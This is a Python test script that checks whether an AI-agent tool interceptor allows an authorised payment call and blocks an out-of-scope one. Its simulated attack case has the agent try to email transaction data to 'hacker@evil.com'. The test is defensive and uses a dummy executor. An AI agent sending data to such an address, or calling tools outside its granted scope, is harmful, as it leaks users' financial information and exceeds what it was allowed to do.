#!/usr/bin/env python3
"""
NIYAM-AI — Production Interceptor Validation (No Streamlit)
=============================================================
Calls intercept_execution() directly, bypassing governance_service
to avoid the Streamlit import. This is the real production PEP path.
"""

import sys
import os
from pathlib import Path

REPO = Path("/mnt/c/IMP/VIT/SY/SEM_2/EDI/NiyamAI-Proj-Code-Original")
sys.path.insert(0, str(REPO))
os.chdir(REPO)  # CWD = REPO_ROOT for relative artifact paths

from schema.intent_contract import IntentContract
from schema.control_flow import ControlFlowIntegrity
from schema.tool_gate import ToolAuthorityGate

# This import triggers validate_proof_environment() at module load
from schema.interceptor import intercept_execution, InterceptionBlocked, _env_report

SEPARATOR = "=" * 62

def section(t):
    print(f"\n{SEPARATOR}\n  {t}\n{SEPARATOR}")

def dummy_execute(tool_name, payload):
    return {"status": "ok", "tool": tool_name, "payload": payload}

# ── Print environment state ──────────────────────────────────
section("PRODUCTION INTERCEPTOR RUN — intercept_execution()")

print(f"[ENV] valid          : {_env_report['valid']}")
print(f"[ENV] ezkl_available : {_env_report['ezkl_available']}")
print(f"[ENV] errors         : {_env_report['errors']}")

if not _env_report["valid"]:
    print("\n[FAIL] Environment invalid — all executions will be BLOCKED")
    sys.exit(1)

print("\n[INFO] Environment valid — proceeding to governed execution")

# ── SAFE CASE ────────────────────────────────────────────────
section("CASE 1: SAFE — proceed_transaction (should EXECUTE)")

contract = IntentContract(
    agent_name="TransactionAgent",
    user_task="Process payment for order #123",
    allowed_tools=["proceed_transaction"],
    forbidden_tools=["send_email", "delete_database"],
)
contract.seal()
cfi = ControlFlowIntegrity(["proceed_transaction"])
gate = ToolAuthorityGate(contract)

tool_name = "proceed_transaction"
payload = {"amount": 100, "recipient": "Vendor_A"}

print(f"[INFO] tool          : {tool_name}")
print(f"[INFO] payload       : {payload}")
print(f"[INFO] intent_hash   : {contract.intent_hash()[:32]}...")
print(f"[INFO] Calling intercept_execution()...")

try:
    result = intercept_execution(
        tool_name=tool_name,
        payload=payload,
        contract=contract,
        cfi=cfi,
        gate=gate,
        execute_func=dummy_execute,
    )
    print(f"\n[OUTCOME] SUCCESS — Tool executed")
    print(f"[RESULT]  {result}")
except InterceptionBlocked as e:
    print(f"\n[OUTCOME] BLOCKED — {e}")
except Exception as e:
    print(f"\n[OUTCOME] ERROR — {e}")

# ── ATTACK CASE ──────────────────────────────────────────────
section("CASE 2: ATTACK — send_email (should BLOCK at Tool Gate)")

contract2 = IntentContract(
    agent_name="TransactionAgent",
    user_task="Process payment for order #123",
    allowed_tools=["proceed_transaction"],
    forbidden_tools=["send_email", "delete_database"],
)
contract2.seal()
cfi2 = ControlFlowIntegrity(["proceed_transaction"])
gate2 = ToolAuthorityGate(contract2)

attack_tool = "send_email"
attack_payload = {"to": "hacker@evil.com", "data": "Transaction info"}

print(f"[INFO] tool          : {attack_tool}")
print(f"[INFO] payload       : {attack_payload}")
print(f"[INFO] Calling intercept_execution()...")

try:
    result2 = intercept_execution(
        tool_name=attack_tool,
        payload=attack_payload,
        contract=contract2,
        cfi=cfi2,
        gate=gate2,
        execute_func=dummy_execute,
    )
    print(f"\n[OUTCOME] SUCCESS (UNEXPECTED!) — {result2}")
except InterceptionBlocked as e:
    print(f"\n[OUTCOME] BLOCKED (correct) — {e}")
except Exception as e:
    print(f"\n[OUTCOME] ERROR — {e}")

section("PRODUCTION INTERCEPTOR VALIDATION COMPLETE")
print("\nCheck audit.db for PROOF_GENERATION_COMPLETED, PROOF_VERIFICATION_COMPLETED, EXECUTED events.")
